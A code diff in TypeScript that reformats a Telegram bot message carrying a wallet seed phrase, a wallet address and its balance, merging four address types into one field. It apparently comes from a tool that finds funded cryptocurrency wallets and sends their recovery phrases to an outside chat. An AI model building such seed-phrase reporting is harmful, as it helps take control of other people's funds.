@@ -9,33 +9,10 @@ export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
     const mensaje = `   📢 Semilla: 
                         ${msj.frase}
                         ---------------
-                        👛 Wallet_Legacy: 
-                        ${msj.direccion_legacy}
+                        👛 Wallet_${msj.wallet_de}: 
+                        ${msj.direccion}
                         ---------------
-                        👛 Wallet_NativeSegWit: 
-                        ${msj.direccion_NativeSegWit}
-                        ---------------
-                        👛 Wallet_Taproot: 
-                        ${msj.direccion_Taproot}
-                        ---------------
-                        👛 Wallet_wrapped: 
-                        ${msj.direccion_wrapped}
-                        ---------------
-                        💰 Saldo actual_legacy: ${msj.saldoActual_legacy}
-                        📥 Saldo recibido: ${msj.saldoRecibido_legacy}
-                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_legacy}
-                        ---------------
-                        💰 Saldo actual_NativeSegWit: ${msj.saldoActual_NativeSegWit}
-                        📥 Saldo recibido: ${msj.saldoRecibido_NativeSegWit}
-                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_NativeSegWit}
-                        ---------------
-                        💰 Saldo actual_Taproot: ${msj.saldoActual_Taproot}
-                        📥 Saldo recibido: ${msj.saldoRecibido_Taproot}
-                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_Taproot}
-                        ---------------
-                        💰 Saldo actual_Taproot: ${msj.saldoActual_wrapped}
-                        📥 Saldo recibido: ${msj.saldoRecibido_wrapped}
-                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_wrapped}
+                        💰 Saldo: ${msj.saldo}
                         `;
       bot
       .sendMessage(chatId, mensaje)
